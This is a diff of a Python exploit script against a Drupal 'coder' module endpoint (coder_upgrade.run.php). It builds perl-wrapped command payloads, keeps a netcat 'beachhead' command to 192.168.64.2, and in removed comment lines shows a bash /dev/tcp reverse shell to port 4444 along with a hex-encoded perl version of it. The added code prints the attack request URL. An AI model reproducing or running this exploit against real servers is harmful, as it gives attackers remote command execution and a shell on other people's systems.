@@ -1,8 +1,8 @@
 from base64 import b64encode
 import requests
+import sys
 
-# Payload translation: bash -c '0<&108-;exec 108<>/dev/tcp/192.168.64.2/4444;sh <&108 >&108 2>&108'
-# PAYLOAD = 'perl -e \'system(pack(qq,H152,,qq,62617368202d632027303c263130382d3b65786563203130383c3e2f6465762f7463702f3139322e3136382e36342e322f343434343b7368203c26313038203e2631303820323e2631303827,))\''
+
 WEBSERVER_PATH = '/sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php'
 BEACHHEAD = 'nc 192.168.64.2 37123'
 
@@ -35,3 +35,6 @@ def create_request(ip_addr: str) -> str:
 def create_payload(to_execute: str) -> str:
     return 'perl -e \'system(' + to_execute + ')\''
         
+
+if __name__ == "__main__":
+    print(create_request(sys.argv[1]).url)
